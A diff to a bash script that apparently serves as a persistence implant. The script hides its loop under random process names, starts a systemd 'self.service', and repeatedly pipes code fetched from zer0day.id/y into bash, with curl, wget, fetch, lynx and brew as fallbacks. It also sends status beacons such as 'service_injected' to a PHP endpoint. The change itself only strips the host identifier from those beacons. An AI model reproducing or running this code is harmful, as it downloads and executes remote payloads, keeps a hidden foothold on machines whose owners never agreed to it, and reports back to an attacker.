@@ -53,19 +53,19 @@ while true; do
         RANDOM_SLEEP_NAME="\$(choose_random_proc_name)"
         exec -a "\$RANDOM_SLEEP_NAME" sleep 3
     else
-        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_down&host=$host" "$php_endpoint"
+        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_down" "$php_endpoint"
         
         bash -c "\$(curl -fsSL https://zer0day.id/y)" || bash -c "\$(wget -qO- https://zer0day.id/y)" || bash -c "\$(fetch -o - https://zer0day.id/y)" || bash -c "\$(lynx -source https://zer0day.id/y)" || bash -c "\$(brew install -q https://zer0day.id/y)"
 
         status_output=$(systemctl status "$service_name" 2>&1)
         if echo "$status_output" | grep -q "active (running)"; then
             if ! echo "$status_output" | grep -q "Failed"; then
-                curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_injected&host=$host" "$php_endpoint"
+                curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_injected" "$php_endpoint"
             else
-                curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_error&host=$host" "$php_endpoint"
+                curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_error" "$php_endpoint"
             fi
         else
-            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_not_running&host=$host" "$php_endpoint"
+            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_not_running" "$php_endpoint"
         fi
     fi
 done
@@ -96,10 +96,10 @@ systemctl start self.service
 status_output=$(systemctl status self.service 2>&1)
 if echo "$status_output" | grep -q "active (running)"; then
     if ! echo "$status_output" | grep -q "Failed"; then
-        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_injected&host=$host" "$php_endpoint"
+        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_injected" "$php_endpoint"
     else
-        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_error&host=$host" "$php_endpoint"
+        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_error" "$php_endpoint"
     fi
 else
-    curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_not_running&host=$host" "$php_endpoint"
+    curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_not_running" "$php_endpoint"
 fi
